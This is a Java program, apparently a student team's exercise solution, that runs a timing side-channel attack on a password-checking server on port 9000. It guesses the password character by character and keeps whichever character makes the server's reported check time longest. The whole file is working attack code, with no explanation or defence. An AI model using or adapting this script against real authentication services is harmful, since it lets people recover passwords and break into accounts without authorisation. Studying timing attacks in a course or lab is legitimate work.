import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

public class LetterTest implements Runnable {

    private final static int ITERATIONS_PER_CHAR = 1;
    private final static int START = 48; // ASCII 0
    private final static int END = 123; // ASCII z

    private static final boolean SPEED_UP_ACTIVE = true;
    // true => the first char with a time difference bigger than SPEED_UP_TIME_IN_SEC is selected as correct
    private static final float SPEED_UP_TIME_IN_SEC = 0.04f;

    public LetterTest() {
    }

    @Override
    public void run() {
        String completePassword = "";
        int speedUp_character;
        String res;

        String time;
        float[] timeArray = new float[ITERATIONS_PER_CHAR];
        float[] timePerChar = new float[255];

        Socket socket;

        try {
            socket = new Socket("localhost", 9000);
            BufferedReader serverReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter serverWriter = new PrintWriter(socket.getOutputStream());

            long timeStart = System.currentTimeMillis();

            serverWriter.println("pwd"); // Password for team44
            serverWriter.flush();
            System.out.println(serverReader.readLine());


            System.out.println("_______________________________");


            res = serverReader.readLine();
            System.out.println(res);

            for (int pass = 0; pass < 21; pass++) {

                speedUp_character = 0;

                for (int i = START; i < END; i++) {
                    String password = completePassword + (char) i;
                    System.out.println("Testing now: " + password);

                    int iterationsPerChar = 0;
                    do {
                        serverWriter.println(password);
                        serverWriter.flush();

                        res = serverReader.readLine();
                        if (pass == 19) // print output at the last "iteration"
                            System.out.println(res);
                        res = serverReader.readLine();
                        if (pass == 19) // print output at the last "iteration"
                            System.out.println(res);

                        //Checked in 0.09930 seconds
                        if (res != null) {
                            time = res.substring(11, 18);
                            timeArray[iterationsPerChar] = Float.parseFloat(time);
                        }
                        iterationsPerChar++;
                    } while (iterationsPerChar < ITERATIONS_PER_CHAR);

                    float sumTime = 0;
                    float avgTime = 0;
                    for (int j = 0; j < ITERATIONS_PER_CHAR; j++) {
                        sumTime += timeArray[j];
                    }
                    avgTime = sumTime / ITERATIONS_PER_CHAR;
                    float checkTime = avgTime - ((pass + 1) * 0.1f);
                    timePerChar[i] = avgTime;

                    // 5 = 5.5
                    if (SPEED_UP_ACTIVE && checkTime > SPEED_UP_TIME_IN_SEC) {
                        speedUp_character = i;
                        System.out.println("Speedup! CheckTime: " + checkTime);
                        break;
                    }
                }

                float max = 0;
                int c = 0;

                if (speedUp_character != 0) {
                    c = speedUp_character;
                } else {
                    for (int i = START; i < END; i++) {
                        if (timePerChar[i] > max) {
                            max = timePerChar[i];
                            c = i;
                        }
                    }
                    System.out.println("______________________");
                    System.out.println("Max time: " + (char) c + " Time: " + max);
                }
                completePassword += (char) c;
                System.out.println("Current Password to check: " + completePassword);
                System.out.println("Time running: " + ((System.currentTimeMillis() - timeStart) / 1000 / 60) + " min");
            }
            serverWriter.close();
            serverReader.close();
            socket.close();

        } catch (IOException e) {
            e.printStackTrace();
        }

        System.out.println("STOPPED!!! " + completePassword);
    }


    public static void main(String[] args) {
        /*** BEFORE STARTING PORT FORWARDING NEEDS TO BE ESTABLISHED! FOR PORT 9000 - OR CHANGE IT AT THE SOCKET */
        Thread th = new Thread(new LetterTest());
        th.start();
    }
}
